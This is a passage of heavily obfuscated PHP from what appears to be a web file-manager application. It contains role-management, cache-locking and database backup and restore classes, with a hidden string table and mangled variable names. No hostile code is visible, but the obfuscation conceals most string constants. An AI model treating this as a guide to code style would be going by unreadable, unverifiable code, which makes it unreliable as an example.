"\151\147\x6e\157\x72\145\x46\151\154\x65\123\151\172\x65", "\x61\144\x6d\x69\156\151\x73\x74\162\141\164\157\x72", "\x73\x6f\162\164"); public function listData($´ôë†šÈ = false, $£ù¡¹ë = "\x73\157\x72\164", $üƒÅó¤Ò = false) { $±¦·‹©õ =& $_SERVER[¡“ËÌ§œ]; $—¿ƒ†µº = parent::listData($´ôë†šÈ, $£ù¡¹ë, $üƒÅó¤Ò); if (!$´ôë†šÈ) { foreach ($—¿ƒ†µº as $ğÔÅ³­Ò => $êƒ’’ŒÚ) { if ($êƒ’’ŒÚ[$±¦·‹©õ[2053]] == 1) { $—¿ƒ†µº[$ğÔÅ³­Ò][$±¦·‹©õ[491]] = LNG($±¦·‹©õ[2290]); } } } return $—¿ƒ†µº; } public function update($µ‚„˜¬†, $éÄÉîÃ) { $³×ÕÅ€ =& $_SERVER[¡“ËÌ§œ]; $ÂîŸĞ‰Š = parent::listData($µ‚„˜¬†); $Èç¿Òç = $this->findByName($éÄÉîÃ[$³×ÕÅ€[32]]); if (!$ÂîŸĞ‰Š || $Èç¿Òç && $Èç¿Òç[$³×ÕÅ€[437]] != $ÂîŸĞ‰Š[$³×ÕÅ€[437]]) { return !1; } if ($Èç¿Òç[$³×ÕÅ€[2053]] == 1) { $éÄÉîÃ = array($³×ÕÅ€[32] => $éÄÉîÃ[$³×ÕÅ€[32]], $³×ÕÅ€[1874] => $éÄÉîÃ[$³×ÕÅ€[1874]]); } $this->filterAuth($éÄÉîÃ[$³×ÕÅ€[451]]); return parent::update($µ‚„˜¬†, $éÄÉîÃ); } public function remove($¬«æ½Ê) { $¡Á‡ƒ½ = parent::listData($¬«æ½Ê); if (!$¡Á‡ƒ½ || $¡Á‡ƒ½[$_SERVER[¡“ËÌ§œ][1307]]) { return !1; } return parent::remove($¬«æ½Ê); } public function add($®÷Û€¥Ë) { $ûÁÕåÒ =& $_SERVER[¡“ËÌ§œ]; $˜€¼ÖÜ¶ = $®÷Û€¥Ë[$ûÁÕåÒ[32]]; if ($this->findByName($˜€¼ÖÜ¶)) { return !1; } $ìùéµØŸ = array($ûÁÕåÒ[458] => $˜€¼ÖÜ¶, $ûÁÕåÒ[1857] => $ûÁÕåÒ[12], $ûÁÕåÒ[1853] => $ûÁÕåÒ[1861], $ûÁÕåÒ[2291] => 1, $ûÁÕåÒ[1856] => 0, $ûÁÕåÒ[2292] => 0, $ûÁÕåÒ[1855] => $this->getSort()); $®÷Û€¥Ë = array_merge($ìùéµØŸ, $®÷Û€¥Ë); $this->filterAuth($®÷Û€¥Ë[$ûÁÕåÒ[451]]); return parent::insert($®÷Û€¥Ë); } private function getSort() { $ş­íéêÊ =& $_SERVER[¡“ËÌ§œ]; $¤ìßî = parent::listData(); $«Ò˜£Ë = array_to_keyvalue($¤ìßî, $ş­íéêÊ[12], $ş­íéêÊ[1875]); return empty($«Ò˜£Ë) ? 0 : max($«Ò˜£Ë) + 1; } private function filterAuth(&$‘•é’¬ñ) { $€Ü»­İÌ =& $_SERVER[¡“ËÌ§œ]; $Õ·æ­ˆ¶ = array(); $îõãâÅ = array_filter(explode($€Ü»­İÌ[50], $‘•é’¬ñ)); foreach ($îõãâÅ as $‘•é’¬ñ) { $£ìÃ‹Àª = explode($€Ü»­İÌ[10], $‘•é’¬ñ); if ($£ìÃ‹Àª[0] == $€Ü»­İÌ[2293] && $£ìÃ‹Àª[1] != $€Ü»­İÌ[1210]) { $‘–àó®œ = $£ìÃ‹Àª[0] . $€Ü»­İÌ[10] . $£ìÃ‹Àª[1] . $€Ü»­İÌ[2294]; if (!in_array($‘–àó®œ, $îõãâÅ)) { $Õ·æ­ˆ¶[] = $‘–àó®œ; } } $Õ·æ­ˆ¶[] = $‘•é’¬ñ; } $‘•é’¬ñ = implode($€Ü»­İÌ[50], $Õ·æ­ˆ¶); } public function findRoleDefault() { $…ûâçóá =& $_SERVER[¡“ËÌ§œ]; $æ¯•Ò³ø = parent::listData(); $ÅÆƒ°ÔÌ = !1; foreach ($æ¯•Ò³ø as $ê¤³µŞñ) { if (!$ê¤³µŞñ || $ê¤³µŞñ[$…ûâçóá[1873]] == $…ûâçóá[198] || $ê¤³µŞñ[$…ûâçóá[2053]] == 1) { continue; } if (strstr($ê¤³µŞñ[$…ûâçóá[451]], $…ûâçóá[2295])) { continue; } if (!strstr($ê¤³µŞñ[$…ûâçóá[451]], $…ûâçóá[2296])) { continue; } if (!$ÅÆƒ°ÔÌ) { $ÅÆƒ°ÔÌ = $ê¤³µŞñ; continue; } $Ú¥½û½ = explode($…ûâçóá[50], $ÅÆƒ°ÔÌ[$…ûâçóá[451]]); $·ï—÷÷” = explode($…ûâçóá[50], $ê¤³µŞñ[$…ûâçóá[451]]); if (count($Ú¥½û½) > count($·ï—÷÷”)) { $ÅÆƒ°ÔÌ = $ê¤³µŞñ; } } return $ÅÆƒ°ÔÌ ? $ÅÆƒ°ÔÌ[$…ûâçóá[437]] : $…ûâçóá[12]; } public function sort($…“Çé‚², $¨²ü„§) { return parent::update($…“Çé‚², $¨²ü„§); } } goto c¢ˆÊ»³Ãí; c¶‚œÜÒ±: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ é¬Á˜ª =& $_SERVER[¡“ËÌ§œ]; if (self::$handle) { return self::$handle; } $åÉºÉ® = $GLOBALS[$ é¬Á˜ª[6]][$ é¬Á˜ª[378]]; self::$timeout = $åÉºÉ®[$ é¬Á˜ª[860]] ? $åÉºÉ®[$ é¬Á˜ª[860]] : 10; $Ş¿Ô¼€ü = _get($GLOBALS[$ é¬Á˜ª[6]], $ é¬Á˜ª[861]); $Ï’§®âø = $åÉºÉ®[$ é¬Á˜ª[847]] ? $åÉºÉ®[$ é¬Á˜ª[847]] : $ é¬Á˜ª[200]; if ($Ï’§®âø == $ é¬Á˜ª[21] && $Ş¿Ô¼€ü == $ é¬Á˜ª[13]) { $Ï’§®âø = $ é¬Á˜ª[200]; } switch ($Ï’§®âø) { case $ é¬Á˜ª[850]: self::$handle = new CacheLockRedis(); break; case $ é¬Á˜ª[851]: self::$handle = new CacheLockMemcached(); break; case $ é¬Á˜ª[21]: self::$handle = new CacheLockDatabase(); break; case $ é¬Á˜ª[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ é¬Á˜ª[862], $ é¬Á˜ª[863]); } return self::$handle; } private static function key($óê•Ç) { return $_SERVER[¡“ËÌ§œ][864] . Cache::key($óê•Ç); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÕµÌ¾ùô = '') { self::$errorMsg = $ÕµÌ¾ùô; } public static function lockGlobal($»ÈƒÓ¸ù, $Ù½…©) { return self::lock($»ÈƒÓ¸ù, $Ù½…©, !0); } public static function lock($§¢èÚß, $«·‘‡¶Ï = false, $®äĞè‹Ó = false) { $Ó™¢äô =& $_SERVER[¡“ËÌ§œ]; $èÄ¡ñŸé = self::init(); $£¬’ü¯ = self::key($§¢èÚß); $«·‘‡¶Ï = $«·‘‡¶Ï ? $«·‘‡¶Ï : self::$timeout; $§ÑäÒÈ¿ = timeFloat(); $ø®üªğ = $èÄ¡ñŸé->lock($£¬’ü¯, $«·‘‡¶Ï); $İÛçÊÇÙ = timeFloat(); if (!$ø®üªğ) { $›ˆ¦õ°È = "\x6c\x6f\143\x6b\40\145\162\162\157\162\x3b\153\x65\171\x3d{$§¢èÚß}\x3b\x74\151\155\x65\x3d{$«·‘‡¶Ï}\x3b" . self::$errorMsg . $Ó™¢äô[71] . get_caller_msg(); $œÆ­µÍÔ = LNG($Ó™¢äô[865]) . "\x28{$«·‘‡¶Ï}\163\x29\x2e" . LNG($Ó™¢äô[866]); $œÆ­µÍÔ .= $Ó™¢äô[867]; if (is_string(self::$errorMsg) && self::$errorMsg) { $œÆ­µÍÔ = $œÆ­µÍÔ . $Ó™¢äô[868] . self::$errorMsg; } write_log($Ó™¢äô[869] . sprintf($Ó™¢äô[870], timeFloat() - $§ÑäÒÈ¿) . $Ó™¢äô[871] . $›ˆ¦õ°È . $Ó™¢äô[872] . error_get_last(), $Ó™¢äô[863]); show_json($œÆ­µÍÔ, !1); } if (!$®äĞè‹Ó) { self::$lockItem[$£¬’ü¯] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ìÚËÜƒÇ = number_format(timeFloat() - $İÛçÊÇÙ, 3); write_log($Ó™¢äô[873] . $§¢èÚß . $Ó™¢äô[874] . $ìÚËÜƒÇ, $Ó™¢äô[863]); } return $ø®üªğ; } public static function lockGet($¾‘›÷†) { $åòæ˜Äó = self::key($¾‘›÷†); if (self::$lockItem[$åòæ˜Äó]) { return self::$lockItem[$åòæ˜Äó]; } return self::init()->lockGet($åòæ˜Äó); } public static function unlock($óÅçš¯) { $€×Ùí±Ç =& $_SERVER[¡“ËÌ§œ]; $ô¦é×¶„ = self::key($óÅçš¯); self::$lockItem[$ô¦é×¶„] = null; self::init()->unlock($ô¦é×¶„); if (GLOBAL_DEBUG_LOG_ALL) { write_log($€×Ùí±Ç[875] . $óÅçš¯, $€×Ùí±Ç[863]); } return; } public static function unlockRuntime() { $²åá¼«Ç =& $_SERVER[¡“ËÌ§œ]; $ığÓ±»Î = self::init(); $ïÑ­Ëóñ = !1; foreach (self::$lockItem as $ÙÎƒÅüİ => $Ûœİï°ë) { if (!$Ûœİï°ë) { continue; } $ığÓ±»Î->unlock($ÙÎƒÅüİ); if (!$ïÑ­Ëóñ) { $ïÑ­Ëóñ = !0; write_log($²åá¼«Ç[876] . $ÙÎƒÅüİ . $²åá¼«Ç[71] . get_caller_msg(), $²åá¼«Ç[863]); continue; } write_log($²åá¼«Ç[876] . $ÙÎƒÅüİ, $²åá¼«Ç[863]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¹Â÷úÍ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($²åá¼«Ç[877] . $¹Â÷úÍ . $²åá¼«Ç[878] . ACTION, $²åá¼«Ç[863]); } } public static function fileLock($·‹’ä˜è) { $‹Ûñ‡²½ =& $_SERVER[¡“ËÌ§œ]; if (!$GLOBALS[$‹Ûñ‡²½[879]]) { $GLOBALS[$‹Ûñ‡²½[879]] = array(); } $GLOBALS[$‹Ûñ‡²½[879]][$·‹’ä˜è] = !1; $Ù’Á‘‚ = fopen(DATA_PATH . $·‹’ä˜è . $‹Ûñ‡²½[880], $‹Ûñ‡²½[881]); if (!$Ù’Á‘‚) { return !1; } $GLOBALS[$‹Ûñ‡²½[879]][$·‹’ä˜è] = $Ù’Á‘‚; if (flock($Ù’Á‘‚, LOCK_EX)) { return !0; } self::unlock($·‹’ä˜è); show_json($‹Ûñ‡²½[882], !1); return !1; } public static function fileUnlock($¥ğœ–ƒÍ) { $«ƒúôÖœ =& $_SERVER[¡“ËÌ§œ]; $·ñš‘™Ë = $GLOBALS[$«ƒúôÖœ[879]][$¥ğœ–ƒÍ]; if (!$·ñš‘™Ë) { return; } $GLOBALS[$«ƒúôÖœ[879]][$¥ğœ–ƒÍ] = !1; flock($·ñš‘™Ë, LOCK_UN); fclose($·ñš‘™Ë); } public static function fileUnlockAll() { $½À½¢‚ =& $_SERVER[¡“ËÌ§œ]; if (!$GLOBALS[$½À½¢‚[879]]) { return; } foreach ($GLOBALS[$½À½¢‚[879]] as $Óƒ¾Û¶ù => $„ÀÈÆÛ²) { if (!$„ÀÈÆÛ²) { continue; } $GLOBALS[$½À½¢‚[879]][$Óƒ¾Û¶ù] = !1; flock($„ÀÈÆÛ², LOCK_UN); fclose($„ÀÈÆÛ²); } $GLOBALS[$½À½¢‚[879]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ £˜ÕËŸ =& $_SERVER[¡“ËÌ§œ]; $•ˆø¸ = $GLOBALS[$ £˜ÕËŸ[6]][$ £˜ÕËŸ[378]]; self::$cachePath = $•ˆø¸[$ £˜ÕËŸ[200]][$ £˜ÕËŸ[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ô¿Ì¼˜‹, $£²š¿³Ç = 0) { $Ä“õÏÛ =& $_SERVER[¡“ËÌ§œ]; $·•ˆàÜğ = microtime(!0); $ÓÊåŞÍ = $·•ˆàÜğ + $£²š¿³Ç + 0.0001; $ä¦†¸ÍÅ = rtrim(self::$cachePath, $Ä“õÏÛ[8]) . $Ä“õÏÛ[883] . md5($Ô¿Ì¼˜‹) . $Ä“õÏÛ[880]; if (file_exists($ä¦†¸ÍÅ) && filemtime($ä¦†¸ÍÅ) && filemtime($ä¦†¸ÍÅ) < time() - 10) { @unlink($ä¦†¸ÍÅ); } do { if (file_exists($ä¦†¸ÍÅ)) { cacheLockWait(); continue; } $–ÉâÍ¢Ü = fopen($ä¦†¸ÍÅ, $Ä“õÏÛ[884]); if (!$–ÉâÍ¢Ü) { return !1; } $è‘Óè¼µ = flock($–ÉâÍ¢Ü, LOCK_EX | LOCK_NB); self::$caches[$Ô¿Ì¼˜‹] = array($Ä“õÏÛ[885] => $–ÉâÍ¢Ü, $Ä“õÏÛ[200] => $ä¦†¸ÍÅ); fwrite($–ÉâÍ¢Ü, $ÓÊåŞÍ); clearstatcache(); if ($–ÉâÍ¢Ü && $è‘Óè¼µ) { return !0; } cacheLockWait(); } while (microtime(!0) < $ÓÊåŞÍ); $this->unlock($Ô¿Ì¼˜‹); return !1; } public function lockGet($§ºŞè¿ş) { $ê¶ñÚğÆ =& $_SERVER[¡“ËÌ§œ]; $ï¾şèê’ = rtrim(self::$cachePath, $ê¶ñÚğÆ[8]) . $ê¶ñÚğÆ[883] . md5($§ºŞè¿ş) . $ê¶ñÚğÆ[880]; return file_exists($ï¾şèê’); } public function unlock($ğ¥Œ•¡„) { $ÄÜèû¹° =& $_SERVER[¡“ËÌ§œ]; $ó¥îÙ¼í = self::$caches[$ğ¥Œ•¡„]; if (!$ó¥îÙ¼í) { return; } @flock($ó¥îÙ¼í[$ÄÜèû¹°[885]], LOCK_UN); @fclose($ó¥îÙ¼í[$ÄÜèû¹°[885]]); @unlink($ó¥îÙ¼í[$ÄÜèû¹°[200]]); unset(self::$caches[$ğ¥Œ•¡„]); } } goto dĞêÏ†î©¦; fŠÓˆô±÷«: class DbManage { function __construct($çºÛ§ú  = array()) { $öÏœ¯Üã =& $_SERVER[¡“ËÌ§œ]; if (empty($çºÛ§ú )) { $çºÛ§ú  = $GLOBALS[$öÏœ¯Üã[6]][$öÏœ¯Üã[21]]; } $this->database = $çºÛ§ú ; } public function model($­º«ä = '') { return new ModelBase($­º«ä, $_SERVER[¡“ËÌ§œ][12], $this->database); } public function db($úÚ±ºãå = false) { $‰„ÀŸ¤¿ =& $_SERVER[¡“ËÌ§œ]; $ƒş»ï­ª = array_change_key_case($this->database); if ($this->dbType() == $‰„ÀŸ¤¿[13] || !$úÚ±ºãå) { return $this->model()->db(); } $ïŒ¿ŞÄ´ = $ƒş»ï­ª[$‰„ÀŸ¤¿[992]]; $ƒş»ï­ª[$‰„ÀŸ¤¿[992]] = $‰„ÀŸ¤¿[12]; if ($ƒş»ï­ª[$‰„ÀŸ¤¿[987]] == $‰„ÀŸ¤¿[984]) { $£ñ€ÉÏ = $ƒş»ï­ª[$‰„ÀŸ¤¿[993]]; $ƒş»ï­ª[$‰„ÀŸ¤¿[993]] = substr($£ñ€ÉÏ, 0, strrpos($£ñ€ÉÏ, $‰„ÀŸ¤¿[1079])); } $this->database = $ƒş»ï­ª; $«ºÑ½§³ = $this->model()->db(); try { $´ìºğÍõ = $«ºÑ½§³->execute("\x73\150\x6f\x77\40\144\141\164\x61\142\x61\163\x65\x73\40\x6c\x69\153\x65\40\47{$ïŒ¿ŞÄ´}\47"); } catch (Exception $õÍ¶øÁ) { } if (!$´ìºğÍõ) { $«ºÑ½§³->execute("\x63\x72\145\141\164\145\40\144\x61\x74\141\142\141\x73\x65\x20\140{$ïŒ¿ŞÄ´}\140"); } $ƒş»ï­ª[$‰„ÀŸ¤¿[992]] = $ïŒ¿ŞÄ´; if ($ƒş»ï­ª[$‰„ÀŸ¤¿[987]] == $‰„ÀŸ¤¿[984]) { $ƒş»ï­ª[$‰„ÀŸ¤¿[993]] .= $‰„ÀŸ¤¿[1079] . $ïŒ¿ŞÄ´; } $this->database = $ƒş»ï­ª; $«ºÑ½§³->execute("\165\x73\145\x20\x60{$ïŒ¿ŞÄ´}\140"); return $«ºÑ½§³; } public function createTable($¯õ°®», &$Ã¦Ïœ±Í) { $¡šµÕ§ç =& $_SERVER[¡“ËÌ§œ]; if (!IO::exist($¯õ°®»)) { ActionCall($¡šµÕ§ç[1080], !0, 0); show_json(LNG($¡šµÕ§ç[1081]), !1); } $Î¬Éœİ£ = $this->model()->db(); $¶ø¡ôºò = sqlSplit(IO::getContent($¯õ°®»)); foreach ($¶ø¡ôºò as $¥°¬ÃèÒ) { $¹¥š…Ğí = stripos($¥°¬ÃèÒ, $¡šµÕ§ç[1082]) === 0; if ($¹¥š…Ğí) { $Ã¦Ïœ±Í->task[$¡šµÕ§ç[806]] += 1; } $Î¬Éœİ£->execute($¥°¬ÃèÒ); if ($¹¥š…Ğí) { preg_match($¡šµÕ§ç[1083], $¥°¬ÃèÒ, $¨şã‘šÅ); $Ã¦Ïœ±Í->task[$¡šµÕ§ç[1084]] = $¨şã‘šÅ[1]; $Ã¦Ïœ±Í->update(1); } } } public function insertTable($ ÏÆéá, &$˜È®ªüø) { $ü‚µÇåğ =& $_SERVER[¡“ËÌ§œ]; $š‚¸ˆúÊ = $this->model()->db(); $èªƒ‘ßë = $óĞÆãä‰ ? array($óĞÆãä‰) : $š‚¸ˆúÊ->getTables(); foreach ($ ÏÆéá as $£µô«çã) { $óĞÆãä‰ = basename($£µô«çã, $ü‚µÇåğ[808]); if (!in_array($óĞÆãä‰, $èªƒ‘ßë)) { continue; } $˜È®ªüø->task[$ü‚µÇåğ[1084]] = $óĞÆãä‰; if (get_filesize($£µô«çã) == 0) { continue; } $ÎÌÊ‰­Ï = $this->sqlToDb($£µô«çã, $˜È®ªüø); if (!$ÎÌÊ‰­Ï) { ActionCall($ü‚µÇåğ[1080], !0, 0); show_json(LNG($ü‚µÇåğ[1085]) . "\x5b{$óĞÆãä‰}\x5d", !1); } } } public function sqlFromDb($ŸÔĞÊÚƒ, $ û¨Ë‡·, &$½ŞÁÓò±, $âÓÛ‘» = '') { if ($½ŞÁÓò±) { $½ŞÁÓò±->task[$_SERVER[¡“ËÌ§œ][1084]] = $ŸÔĞÊÚƒ; } $³ñíñï  = $this->model($ŸÔĞÊÚƒ); $©š©¾ = 0; $×’Ÿ£“ó = 0; $¤ˆÕæ÷¨ = 10000; $øõŞà = fopen($ û¨Ë‡·, $_SERVER[¡“ËÌ§œ][1086]); $Âİ˜˜ = $³ñíñï ->getPk(); $ÖªİÍµß = $³ñíñï ->getDbFields(); $¹§ß÷¦£ = $_SERVER[¡“ËÌ§œ][12]; if ($GLOBALS[$_SERVER[¡“ËÌ§œ][807]] && in_array($ŸÔĞÊÚƒ, array($_SERVER[¡“ËÌ§œ][1087], $_SERVER[¡“ËÌ§œ][1088]))) { $¹§ß÷¦£ = $ŸÔĞÊÚƒ; } do { $ûÄ¶¨ªş = array($Âİ˜˜ => array($_SERVER[¡“ËÌ§œ][1034], $×’Ÿ£“ó)); $ÃÇú•– = $³ñíñï ->where($ûÄ¶¨ªş)->field($ÖªİÍµß)->order($Âİ˜˜ . $_SERVER[¡“ËÌ§œ][1089])->limit($¤ˆÕæ÷¨)->select(); $ÃÇú•– = !empty($ÃÇú•–) ? $ÃÇú•– : array(); if (!($•­‹Ë¶‘ = count($ÃÇú•–))) { break; } $Ô››­ø = end($ÃÇú•–); $×’Ÿ£“ó = $Ô››­ø[$Âİ˜˜]; $ÏîÊ´è× = array(); foreach ($ÃÇú•– as $Ü­—»“) { if ($¹§ß÷¦£) { if ($ŸÔĞÊÚƒ == $_SERVER[¡“ËÌ§œ][1087]) { if ($Ü­—»“[$_SERVER[¡“ËÌ§œ][33]] == $_SERVER[¡“ËÌ§œ][1090]) { $ÖŸî¢ôÂ = json_decode($Ü­—»“[$_SERVER[¡“ËÌ§œ][403]], !0); if ($ÖŸî¢ôÂ[$_SERVER[¡“ËÌ§œ][32]] == $GLOBALS[$_SERVER[¡“ËÌ§œ][807]] && $ÖŸî¢ôÂ[$_SERVER[¡“ËÌ§œ][770]] != 1) { continue; } } } else { if ($Ü­—»“[$_SERVER[¡“ËÌ§œ][33]] == $_SERVER[¡“ËÌ§œ][1091] && $Ü­—»“[$_SERVER[¡“ËÌ§œ][94]] == $_SERVER[¡“ËÌ§œ][799]) { continue; } } } if ($âÓÛ‘») { $Ü­—»“[$_SERVER[¡“ËÌ§œ][84]] = "\x7b\x69\x6f\x3a{$âÓÛ‘»}\x7d" . substr($Ü­—»“[$_SERVER[¡“ËÌ§œ][84]], strlen("\x7b\x69\157\x3a{$Ü­—»“[$_SERVER[¡“ËÌ§œ][837]]}\x7d")); $Ü­—»“[$_SERVER[¡“ËÌ§œ][837]] = $âÓÛ‘»; } $ÏîÊ´è×[] = $_SERVER[¡“ËÌ§œ][1092] . $this->sqlEncode($Ü­—»“) . $_SERVER[¡“ËÌ§œ][1093]; } $ìµÃÕç¼ = "\111\x4e\123\x45\122\124\x20\111\x4e\124\x4f\x20\140{$ŸÔĞÊÚƒ}\140\x20\x28\x60" . implode($_SERVER[¡“ËÌ§œ][1094], $ÖªİÍµß) . $_SERVER[¡“ËÌ§œ][1095]; fwrite($øõŞà, $ìµÃÕç¼ . implode($_SERVER[¡“ËÌ§œ][1096], $ÏîÊ´è×) . $_SERVER[¡“ËÌ§œ][71] . PHP_EOL); $©š©¾ += $•­‹Ë¶‘; if ($½ŞÁÓò±) { $½ŞÁÓò±->update($•­‹Ë¶‘); } } while ($¤ˆÕæ÷¨ == $•­‹Ë¶‘); fclose($øõŞà); return $©š©¾; } public function sqlToDb($Ğ©ùéàÌ, &$²‰ñˆıã) { $‘«åì¸£ =& $_SERVER[¡“ËÌ§œ]; $Ã´ò…æ¾ = $this->model()->db(); $ù—„ØØ = @fopen($Ğ©ùéàÌ, $‘«åì¸£[1097]); if (!$ù—„ØØ) { return !1; } $¤Ù¢¦Ø¸ = 0; $•æØ¡å = $‘«åì¸£[12]; $¶ÎÈäè = array(); $ã¹ÛÓ› = $this->dbType(); $´èÏ‚Ñ = $ã¹ÛÓ› == $‘«åì¸£[13] ? 500 : 2000; $Š‡÷”ªı = basename($Ğ©ùéàÌ, $‘«åì¸£[808]); $ÆÈªù°å = 0; $Éœ®–ä = 4194304 - 104858; $ó°®Ÿ¼› = 1000000 - 104858; while (!feof($ù—„ØØ)) { $õÆ¹€ò€ = trim(fgets($ù—„ØØ)); if (!$õÆ¹€ò€) { continue; } $áƒ÷ı·¶ = $this->sqlDecode($õÆ¹€ò€, $ã¹ÛÓ›, $Š‡÷”ªı); if (stripos($áƒ÷ı·¶, $‘«åì¸£[384]) === 0) { if (!$•æØ¡å) { $•æØ¡å = $áƒ÷ı·¶ . $‘«åì¸£[53]; } continue; } if ($²‰ñˆıã) { $²‰ñˆıã->task[$‘«åì¸£[806]] += 1; } $¤Ù¢¦Ø¸++; $¶ÎÈäè[] = rtrim(rtrim(trim($áƒ÷ı·¶), $‘«åì¸£[50]), $‘«åì¸£[71]); $Ö“¢¡û = null; $Ü«®»ß‡ = strlen($áƒ÷ı·¶); $ÆÈªù°å += $Ü«®»ß‡; if ($ÆÈªù°å >= ($´èÏ‚Ñ == 500 ? $ó°®Ÿ¼› : $Éœ®–ä)) { $Ö“¢¡û = array_pop($¶ÎÈäè); if ($¤Ù¢¦Ø¸ > 1) { $¤Ù¢¦Ø¸--; } } if ($¤Ù¢¦Ø¸ >= $´èÏ‚Ñ || $Ö“¢¡û) { $áƒ÷ı·¶ = $•æØ¡å . implode($‘«åì¸£[50], $¶ÎÈäè); if (!$Ã´ò…æ¾->execute($áƒ÷ı·¶)) { return !1; } if ($²‰ñˆıã) { $²‰ñˆıã->update($¤Ù¢¦Ø¸); } $¶ÎÈäè = array(); $¤Ù¢¦Ø¸ = 0; $ÆÈªù°å = 0; if ($Ö“¢¡û) { $¶ÎÈäè = array($Ö“¢¡û); $¤Ù¢¦Ø¸ = 1; $ÆÈªù°å = $Ü«®»ß‡; } } } fclose($ù—„ØØ); if (!empty($¶ÎÈäè)) { $áƒ÷ı·¶ = $•æØ¡å . implode($‘«åì¸£[50], $¶ÎÈäè); if (!$Ã´ò…æ¾->execute($áƒ÷ı·¶)) { return !1; } if ($²‰ñˆıã) { $²‰ñˆıã->update($¤Ù¢¦Ø¸); } } return !0; } public function dropTable($—  ”Û¹ = null) { $‡²›î˜ = $this->model()->db(); $ğÀ©Ô—× = $—  ”Û¹ ? array($—  ”Û¹) : $‡²›î˜->getTables(); if (!$ğÀ©Ô—×) { return; } foreach ($ğÀ©Ô—× as $—  ”Û¹) { if ($—  ”Û¹) { $—  ”Û¹ = strtolower($—  ”Û¹); } else { continue; } $‡²›î˜->execute("\x64\162\157\160\40\164\x61\x62\x6c\x65\x20\x69\x66\x20\145\x78\x69\163\164\x73\x20\140{$—  ”Û¹}\140"); } } private function sqlEncode($µÉÖ©Èş) { $Æ··¶³ =& $_SERVER[¡“ËÌ§œ]; $¯†êô¡ë = array(); foreach ($µÉÖ©Èş as $†Ç¾Íû) { if (is_array($†Ç¾Íû)) { $†Ç¾Íû = json_encode_force($†Ç¾Íû); } $†Ç¾Íû = addslashes($†Ç¾Íû); $†Ç¾Íû = str_replace(array($Æ··¶³[1098], $Æ··¶³[231]), array($Æ··¶³[1099], $Æ··¶³[1100]), $†Ç¾Íû); $¯†êô¡ë[] = str_replace($Æ··¶³[58], $Æ··¶³[1101], $†Ç¾Íû); } return $Æ··¶³[58] . implode($Æ··¶³[1102], $¯†êô¡ë) . $Æ··¶³[58]; } private function sqlDecode($ø÷¿ÌÈ€, $ñŸ ×«¯, $èŸì³µ€ = '') { $‘Ø¿âÛ =& $_SERVER[¡“ËÌ§œ]; $ø÷¿ÌÈ€ = str_replace(array($‘Ø¿âÛ[1099], $‘Ø¿âÛ[1100]), array($‘Ø¿âÛ[1098], $‘Ø¿âÛ[231]), $ø÷¿ÌÈ€); if ($ñŸ ×«¯ == $‘Ø¿âÛ[13]) { return $èŸì³µ€ != $‘Ø¿âÛ[1103] ? stripslashes($ø÷¿ÌÈ€) : $ø÷¿ÌÈ€; } if ($èŸì³µ€ == $‘Ø¿âÛ[1103]) { $ø÷¿ÌÈ€ = str_replace($‘Ø¿âÛ[1104], $‘Ø¿âÛ[118], stripslashes($ø÷¿ÌÈ€)); } return $ø÷¿ÌÈ€; } public function getSqlFile($µŠ€€ô‰ = '') { $ÜÁ£Ç‰â =& $_SERVER[¡“ËÌ§œ]; $®ë™ğÄÆ = $this->dbType(!0); $º–ÒÅìó = CONTROLLER_DIR . "\x69\x6e\x73\164\x61\x6c\154\57\144\141\164\141\57{$®ë™ğÄÆ}\x2e\x73\161\154"; $÷·Ñ–¶ø = file_get_contents($º–ÒÅìó); $¹‚Üõ³¤ = $ÜÁ£Ç‰â[1105] . ($®ë™ğÄÆ == $ÜÁ£Ç‰â[824] ? $ÜÁ£Ç‰â[1106] : $ÜÁ£Ç‰â[1107]) . $ÜÁ£Ç‰â[1108]; preg_match_all($¹‚Üõ³¤, $÷·Ñ–¶ø, $èæÄÃ›); $î‘ñË˜ = $èæÄÃ›[1]; $ø“§–‡ = $this->model()->db(); $Çİ…µ— = $ø“§–‡->getTables(); $•¶ÜÌœ­ = TEMP_FILES . $ÜÁ£Ç‰â[1109] . date($ÜÁ£Ç‰â[240]) . $ÜÁ£Ç‰â[8]; del_dir($•¶ÜÌœ­); mk_dir($•¶ÜÌœ­); $·ø•„„ô = $•¶ÜÌœ­ . $ÜÁ£Ç‰â[1110]; $”“‹€§¡ = $•¶ÜÌœ­ . $ÜÁ£Ç‰â[1111]; $¡²ñœ‡Â = $®ë™ğÄÆ == $ÜÁ£Ç‰â[13] ? $ÜÁ£Ç‰â[824] : $ÜÁ£Ç‰â[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\164\141\154\x6c\57\144\x61\x74\141\x2f{$¡²ñœ‡Â}\56\163\x71\154", $•¶ÜÌœ­); @touch($•¶ÜÌœ­ . $®ë™ğÄÆ . $ÜÁ£Ç‰â[808]); $åØ“±¿™ = fopen($·ø•„„ô, $ÜÁ£Ç‰â[1086]); $­æ€“Æ = fopen($”“‹€§¡, $ÜÁ£Ç‰â[1086]); if ($®ë™ğÄÆ == $ÜÁ£Ç‰â[13]) { $Çİ…µ— = array_diff($Çİ…µ—, array($ÜÁ£Ç‰â[804], $ÜÁ£Ç‰â[805])); $£™î¬Ä³ = array($ÜÁ£Ç‰â[1112], $ÜÁ£Ç‰â[1113], $ÜÁ£Ç‰â[1114]); fwrite($­æ€“Æ, implode(PHP_EOL, $£™î¬Ä³) . PHP_EOL . PHP_EOL); foreach ($Çİ…µ— as $ªÓ–Ïîé) { $¶Â“¯ = $this->sqlFromSqlite($ªÓ–Ïîé); if (!$¶Â“¯[$ÜÁ£Ç‰â[13]]) { continue; } fwrite($­æ€“Æ, $¶Â“¯[$ÜÁ£Ç‰â[13]] . PHP_EOL . PHP_EOL); if (!in_array($ªÓ–Ïîé, $î‘ñË˜)) { fwrite($åØ“±¿™, $¶Â“¯[$ÜÁ£Ç‰â[824]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Çİ…µ— as $ªÓ–Ïîé) { $¶Â“¯ = $this->sqlFromMysql($ªÓ–Ïîé); if 